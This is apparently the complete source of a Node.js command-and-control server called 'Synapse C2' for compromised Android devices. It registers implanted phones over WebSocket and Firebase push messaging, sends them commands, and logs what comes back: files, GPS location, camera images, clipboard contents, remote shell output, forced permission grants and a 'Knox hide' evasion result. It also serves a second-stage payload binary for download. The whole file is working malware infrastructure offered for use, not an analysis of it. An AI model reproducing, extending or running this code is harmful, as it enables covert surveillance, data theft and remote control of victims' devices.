'use strict';

const fs = require('fs');
const path = require('path');
const https = require('https');
const { execSync } = require('child_process');
const { v4: uuidv4 } = require('uuid');
const express = require('express');
const { WebSocketServer } = require('ws');

const cryptoModule = require('./crypto');
const fcm = require('./fcm');

const PORT = process.env.PORT || 8443;
const CERT_DIR = path.join(__dirname, 'certs');
const KEY_PATH = path.join(CERT_DIR, 'server.key');
const CERT_PATH = path.join(CERT_DIR, 'server.crt');
const STAGE2_DIR = path.join(__dirname, 'stage2');
const STAGE2_FILE = path.join(STAGE2_DIR, 'stage2.bin');

function timestamp() {
  return new Date().toISOString();
}

function log(level, ...args) {
  const ts = `[${timestamp()}]`;
  switch (level) {
    case 'error': console.error(ts, '[ERROR]', ...args); break;
    case 'warn':  console.warn(ts,  '[WARN]',  ...args); break;
    case 'info':  console.log(ts,   '[INFO]',  ...args); break;
    case 'debug': console.log(ts,   '[DEBUG]', ...args); break;
  }
}

// ─── Pretty-print typed response ────────────────────────────────────────────

function prettyPrintResponse(deviceId, result) {
  if (!result || typeof result !== 'object') return;

  const type = result.type || 'unknown';
  const payload = result.payload || {};
  const status = result.status || 'ok';

  switch (type) {
    case 'PingResponse':
      console.log(`  [PONG] ${payload.latency_ms || 0}ms from ${deviceId}`);
      break;

    case 'DeviceInfoResponse':
      console.log(`  [DEVICE] ${payload.brand || '?'} ${payload.model || '?'} (SDK ${payload.sdk}) fingerprint=${(payload.fingerprint || '').substring(0, 40)}...`);
      break;

    case 'FileListResponse': {
      const entries = payload.entries || [];
      const byPath = {};
      for (const e of entries) {
        const dir = path.dirname(e.path || '/') || '/';
        if (!byPath[dir]) byPath[dir] = 0;
        byPath[dir]++;
      }
      const summary = Object.entries(byPath).map(([d, c]) => `${c} from ${d}`).join(', ');
      console.log(`  [FILES] ${entries.length} entries: ${summary || '(empty)'}`);
      break;
    }

    case 'FileReadResponse': {
      const kb = ((payload.size_bytes || 0) / 1024).toFixed(1);
      const mime = payload.mime_type || 'application/octet-stream';
      console.log(`  [FILE_READ] ${payload.file_id} ${mime} (${kb}KB) base64 length=${(payload.base64_data || '').length}`);
      break;
    }

    case 'LocationResponse':
      console.log(`  [LOCATION] ${payload.lat}, ${payload.lng} (±${payload.accuracy || '?'}m) via ${payload.provider || 'unknown'}`);
      break;

    case 'ShellResponse': {
      const stdout = (payload.stdout || '').substring(0, 120);
      const stderr = (payload.stderr || '').substring(0, 80);
      console.log(`  [SHELL] exit=${payload.exit_code} stdout="${stdout}"${stderr ? ` stderr="${stderr}"` : ''}`);
      break;
    }

    case 'CameraResponse': {
      const kb = ((payload.size_bytes || 0) / 1024).toFixed(0);
      const dims = payload.width && payload.height ? `${payload.width}x${payload.height}` : '?x?';
      console.log(`  [CAMERA] ${dims} ${payload.format || 'JPEG'} (${kb}KB)`);
      break;
    }

    case 'ClipboardResponse':
      console.log(`  [CLIPBOARD] ${payload.entry_count || 0} entries via ${payload.provider_type || '?'}${payload.vulnerability ? ' (' + payload.vulnerability + ')' : ''}`);
      break;

    case 'PermissionGrantResponse':
      console.log(`  [PERMISSION] ${(payload.granted || []).length}/${(payload.target_permissions || []).length} granted, ${(payload.failed || []).length} failed`);
      break;

    case 'KnoxHideResponse': {
      const icon = payload.success ? '✓' : '✗';
      console.log(`  [KNOX_HIDE] ${icon} technique=${payload.technique || '?'} status=${payload.service_status || '?'} pkg=${payload.target_package || '?'}`);
      break;
    }

    case 'ErrorResponse':
      console.log(`  [ERROR] ${payload.error || result.error || 'unknown'} (module: ${payload.module || '?'})`);
      break;

    case 'parse_error':
      console.log(`  [PARSE_ERROR] ${result.error || 'unknown'}`);
      break;

    default:
      console.log(`  [${type}] status=${status}`, JSON.stringify(payload).substring(0, 300));
      break;
  }

  // Also log raw JSON at debug level
  log('debug', `Raw response: ${JSON.stringify(result).substring(0, 500)}`);
}

// ─── TLS ────────────────────────────────────────────────────────────────────

function ensureCerts() {
  if (!fs.existsSync(CERT_DIR)) fs.mkdirSync(CERT_DIR, { recursive: true });
  if (!fs.existsSync(KEY_PATH) || !fs.existsSync(CERT_PATH)) {
    log('info', 'Generating self-signed TLS certificate...');
    execSync(
      `openssl req -x509 -newkey rsa:4096 -keyout "${KEY_PATH}" -out "${CERT_PATH}" -days 365 -nodes -subj "/CN=synapse-c2"`,
      { stdio: 'inherit' }
    );
    log('info', 'TLS certificate generated.');
  } else {
    log('info', 'TLS certificates found.');
  }
}

// ─── Device Registry ────────────────────────────────────────────────────────

const devices = new Map();

function getDevice(id) { return devices.get(id); }

function registerDevice(id, ws) {
  const existing = devices.get(id);
  if (existing) {
    existing.ws = ws;
    existing.lastSeen = Date.now();
    flushQueue(id);
  } else {
    devices.set(id, { ws, fcmToken: null, lastSeen: Date.now(), info: '{}', queue: [] });
  }
}

function flushQueue(id) {
  const dev = devices.get(id);
  if (!dev || !dev.ws || dev.ws.readyState !== 1) return;
  while (dev.queue.length > 0) {
    const cmd = dev.queue.shift();
    dev.ws.send(JSON.stringify(cmd));
    log('debug', `Flushed queued command to ${id}`);
  }
}

function sendCommand(id, module, action, params = {}) {
  const cmd = { cmd_id: uuidv4(), module, action, params };
  const dev = devices.get(id);
  if (dev && dev.ws && dev.ws.readyState === 1) {
    dev.ws.send(JSON.stringify(cmd));
    log('info', `Command sent via WS to ${id}: ${module}/${action}`);
  } else if (dev && dev.fcmToken && fcm.isConfigured()) {
    dev.queue.push(cmd);
    fcm.sendCommand(dev.fcmToken, cmd);
    log('info', `Command pushed via FCM to ${id}: ${module}/${action}`);
  } else {
    log('warn', `Device ${id} offline — no WS or FCM`);
    return false;
  }
  return true;
}

// ─── Express + HTTPS ────────────────────────────────────────────────────────

const app = express();
app.use(express.json());
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Headers', '*');
  res.header('Access-Control-Allow-Methods', '*');
  if (req.method === 'OPTIONS') return res.sendStatus(200);
  next();
});

app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', uptime: process.uptime(), devices: devices.size, fcm: fcm.isConfigured() });
});

app.get('/api/devices', (req, res) => {
  const list = [];
  for (const [id, dev] of devices) {
    list.push({
      device_id: id,
      fcm: !!dev.fcmToken,
      online: !!(dev.ws && dev.ws.readyState === 1),
      lastSeen: new Date(dev.lastSeen).toISOString(),
      info: dev.info
    });
  }
  res.json(list);
});

app.post('/api/register-fcm', (req, res) => {
  const { device_id, fcm_token } = req.body;
  if (!device_id || !fcm_token) return res.status(400).json({ error: 'missing device_id or fcm_token' });
  const dev = devices.get(device_id);
  if (dev) {
    dev.fcmToken = fcm_token;
    log('info', `FCM token registered for ${device_id}`);
  } else {
    devices.set(device_id, { ws: null, fcmToken: fcm_token, lastSeen: Date.now(), info: '{}', queue: [] });
    log('info', `Device ${device_id} created with FCM token`);
  }
  res.json({ status: 'ok' });
});

app.post('/api/command', (req, res) => {
  const { device_id, module, action, params } = req.body;
  if (!device_id || !module || !action) return res.status(400).json({ error: 'missing fields' });
  const sent = sendCommand(device_id, module, action, params || {});
  res.json({ status: sent ? 'sent' : 'queued_or_offline' });
});

app.post('/api/result', (req, res) => {
  const raw = req.body;
  let decrypted = raw;
  try {
    if (typeof raw === 'string') decrypted = cryptoModule.decrypt(raw);
    else if (typeof raw === 'object' && raw.p) decrypted = cryptoModule.decrypt(raw.p);
  } catch (e) {
    // result was plaintext
  }
  try {
    const parsed = typeof decrypted === 'string' ? JSON.parse(decrypted) : decrypted;
    prettyPrintResponse(req.body.device_id || '?', parsed);
  } catch (e) {
    log('info', `Result: ${typeof decrypted === 'string' ? decrypted.substring(0, 200) : JSON.stringify(decrypted).substring(0, 200)}`);
  }
  res.json({ status: 'ok' });
});

app.get('/api/stage2', (req, res) => {
  if (fs.existsSync(STAGE2_FILE)) {
    res.setHeader('Content-Type', 'application/octet-stream');
    fs.createReadStream(STAGE2_FILE).pipe(res);
  } else {
    res.status(404).json({ error: 'stage2 not deployed' });
  }
});

// ─── Start ──────────────────────────────────────────────────────────────────

ensureCerts();
fcm.init();
const tlsOptions = { key: fs.readFileSync(KEY_PATH), cert: fs.readFileSync(CERT_PATH) };
const server = https.createServer(tlsOptions, app);

const wss = new WebSocketServer({ server, path: '/c2' });

wss.on('connection', (ws, req) => {
  const clientIp = req.socket.remoteAddress;
  log('info', `WS connection from ${clientIp}`);

  let deviceId = null;

  ws.on('message', (raw) => {
    const rawStr = Buffer.isBuffer(raw) ? raw.toString('utf8') : String(raw);
    log('debug', `WS message: ${rawStr.substring(0, 200)}`);

    // Try JSON parse for registration
    try {
      const msg = JSON.parse(rawStr);
      if (msg.type === 'register' && msg.device_id) {
        deviceId = msg.device_id;
        registerDevice(deviceId, ws);
        log('info', `Device registered: ${deviceId}`);
        ws.send(JSON.stringify({ type: 'registered', device_id: deviceId }));
        return;
      }
    } catch (e) { /* not JSON — treat as encrypted */ }

    // Encrypted data from device
    if (deviceId) {
      try {
        const decrypted = cryptoModule.decrypt(rawStr);
        try {
          const result = JSON.parse(decrypted);
          prettyPrintResponse(deviceId, result);
        } catch (e) {
          // Not valid JSON — log raw
          log('info', `Result from ${deviceId}: ${decrypted.substring(0, 200)}`);
        }
      } catch (e) {
        log('warn', `Decrypt failed from ${deviceId}: ${e.message}`);
      }
    }
  });

  ws.on('close', () => {
    if (deviceId) {
      const dev = devices.get(deviceId);
      if (dev) dev.ws = null;
      log('info', `Device disconnected: ${deviceId}`);
    }
  });

  ws.on('error', (err) => {
    log('error', `WS error: ${err.message}`);
  });
});

server.listen(PORT, () => {
  const stageOk = fs.existsSync(STAGE2_FILE);
  console.log();
  console.log('╔════════════════════════════════════════════════════════╗');
  console.log('║              Synapse C2 Server                        ║');
  console.log('╠════════════════════════════════════════════════════════╣');
  console.log(`║  HTTPS      : https://0.0.0.0:${PORT}                  ║`);
  console.log(`║  WebSocket  : wss://0.0.0.0:${PORT}/c2                ║`);
  console.log(`║  FCM        : ${fcm.isConfigured() ? 'READY' : 'DISABLED'}                              ║`);
  console.log(`║  Stage 2    : ${stageOk ? 'DEPLOYED' : 'MISSING'}                          ║`);
  console.log('╚════════════════════════════════════════════════════════╝');
  console.log();
});

process.on('SIGINT', shutdown);
process.on('SIGTERM', shutdown);

function shutdown() {
  log('info', 'Shutting down...');
  for (const [id, dev] of devices) {
    if (dev.ws) dev.ws.close();
  }
  server.close(() => process.exit(0));
}
